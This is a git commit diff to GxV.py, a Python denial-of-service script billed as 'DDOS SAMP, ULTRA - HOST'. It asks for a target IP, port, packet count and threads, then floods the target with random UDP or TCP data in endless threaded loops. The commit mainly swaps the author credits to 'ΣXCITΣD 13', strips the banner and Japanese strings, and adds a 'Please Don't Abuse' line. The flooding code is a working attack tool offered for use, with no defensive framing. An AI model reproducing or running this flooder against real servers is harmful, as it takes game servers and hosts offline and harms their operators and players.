b3f8b28d2111f40039d3b6ba6bf49f7e5be4c19e
DevterXyz <105544452+DevterXyz@users.noreply.github.com>
2022-07-11 01:49:20 +0000

    Update GxV.py

--- GxV.py
+++ GxV.py
@@ -1,6 +1,5 @@
-#!/usr/bin/env python3
-#Yahh Tertangkap gwa
-#Manfactured By RutzX
+#RenameGuaTembakPalalu
+#Author : ΣXCITΣD 13
 import random
 import socket
 import threading
@@ -9,43 +8,35 @@ import sys
 
 os.system("clear")
 
-print("""\033[1;31;40m
+print("""\033[1;31;40m""")
 
-
-████████████████████████████████
-█▄─▄▄▀█▄─██─▄█─▄─▄─█░▄▄░▄█▄─▀─▄█
-██─▄─▄██─██─████─████▀▄█▀██▀─▀██
-▀▄▄▀▄▄▀▀▄▄▄▄▀▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄█▄▄▀
-""")
-
-print("===攻撃するだけではいけませ===")
-print("--- AUTHOR BY : RutzX ---")
-print("--- TOOLS BY : Anti Terror---")
-print("--- 吸うだけじゃない---")
+print("--- AUTHOR BY : ΣXCITΣD 13 ---")
+print("--- TOOLS BY : ΣXCITΣD 13 ---")
+print("---   Please Don't Abuse ---")
 print("===================================")
-print("DDOS FOR SAMP, ULTRA - HOST, 20GTPS")
+print("DDOS SAMP, ULTRA - HOST, ΣXCITΣD 13")
 print("========== VERSION 1.0 ============")
 ip = str(input(" IP:"))
 port = int(input(" Port:"))
-choice = str(input(" UDPを攻撃する?(y/n):"))
+choice = str(input(" UDP?(y/n):"))
 times = int(input(" Package:"))
 threads = int(input(" Threads:"))
 def run():
   data = random._urandom(1024)
-  i = random.choice(("[]","[!]","[#]"))
+  i = random.choice(("[*]","[!]","[#]"))
   while True:
     try:
       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-      print(i +"攻撃中")
+      print(i +"ΣXCITΣD 13")
     except:
-      print("DOWN!!")
+      print("DOWN!!!")
 
 def run2():
   data = random._urandom(16)
-  i = random.choice(("[]","[!]","[#]"))
+  i = random.choice(("[*]","[!]","[#]"))
   while True:
     try:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -53,7 +44,7 @@ def run2():
       s.send(data)
       for x in range(times):
         s.send(data)
-      print(i +" Sent!!!")
+      print(i +" ΣXCITΣD 13!!! ")
     except:
       s.close()
       print("[*] Error")
